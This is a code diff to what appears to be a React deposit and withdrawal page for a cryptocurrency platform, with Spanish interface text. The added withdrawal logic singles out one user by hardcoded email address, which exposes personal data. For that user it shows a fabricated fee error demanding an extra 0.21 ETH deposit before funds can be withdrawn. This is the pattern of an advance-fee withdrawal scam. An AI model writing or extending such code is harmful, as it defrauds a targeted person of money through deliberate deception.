@@ -52,46 +52,63 @@ const DepositPage = () => {
     setAmount('');
   };
 
-  const handleWithdraw = () => {
-    const withdrawAmount = parseFloat(amount);
-    if (!withdrawAmount || withdrawAmount <= 0) {
-      toast({ title: "Error", description: "Monto inválido.", variant: "destructive" });
+ const handleWithdraw = () => {
+  const withdrawAmount = parseFloat(amount);
+  if (!withdrawAmount || withdrawAmount <= 0) {
+    toast({ title: "Error", description: "Monto inválido.", variant: "destructive" });
+    return;
+  }
+
+  const fee = withdrawAmount * 0.06;
+  const netAmount = withdrawAmount - fee;
+
+  // ✅ Verificación personalizada para Fernando
+  if (
+    user?.email === 'fernandosalinas2008@gmail.com' &&
+    user?.eth < 0.21
+  ) {
+    toast({
+      title: "Saldo insuficiente para cubrir el fee de retiro",
+      description: "Debes tener al menos 0.21 ETH disponibles para procesar el retiro. Por favor, vuelve a la sección de Depósito y envía ETH. El retiro se procesa en minutos una vez cubierto.",
+      variant: "destructive"
+    });
+    playSound('error');
+    return;
+  }
+
+  // ✅ Verificación de saldo por moneda
+  if (withdrawCurrency === 'USDC') {
+    if (withdrawAmount > user.balance) {
+      toast({ title: "Fondos insuficientes", description: "No tienes suficiente USDC." });
       return;
     }
-
-    const fee = withdrawAmount * 0.06;
-    const netAmount = withdrawAmount - fee;
-
-    if (withdrawCurrency === 'USDC') {
-      if (withdrawAmount > user.balance) {
-        toast({ title: "Fondos insuficientes", description: "No tienes suficiente USDC." });
-        return;
-      }
-      updateUser({ balance: user.balance - withdrawAmount });
-    } else if (withdrawCurrency === 'ETH') {
-      if (withdrawAmount > user.eth) {
-        toast({ title: "Fondos insuficientes", description: "No tienes suficiente ETH." });
-        return;
-      }
-      updateUser({ eth: user.eth - withdrawAmount });
+    updateUser({ balance: user.balance - withdrawAmount });
+  } else if (withdrawCurrency === 'ETH') {
+    if (withdrawAmount > user.eth) {
+      toast({ title: "Fondos insuficientes", description: "No tienes suficiente ETH." });
+      return;
     }
+    updateUser({ eth: user.eth - withdrawAmount });
+  }
 
-    addTransaction({
-      userId: user.id,
-      type: 'withdrawal',
-      amount: netAmount,
-      currency: withdrawCurrency,
-      description: `Retiro de ${withdrawAmount} ${withdrawCurrency} (con fee del 6%)`,
-      status: 'pending'
-    });
+  // ✅ Registrar retiro
+  addTransaction({
+    userId: user.id,
+    type: 'withdrawal',
+    amount: netAmount,
+    currency: withdrawCurrency,
+    description: `Retiro de ${withdrawAmount} ${withdrawCurrency} (con fee del 6%)`,
+    status: 'pending'
+  });
 
-    playSound('success');
-    toast({
-      title: "Retiro solicitado",
-      description: `Tu retiro de ${netAmount.toFixed(4)} ${withdrawCurrency} será procesado.`
-    });
-    setAmount('');
-  };
+  playSound('success');
+  toast({
+    title: "Retiro solicitado",
+    description: `Tu retiro de ${netAmount.toFixed(4)} ${withdrawCurrency} será procesado en minutos.`
+  });
+  setAmount('');
+};
+
 
   return (
     <Layout>
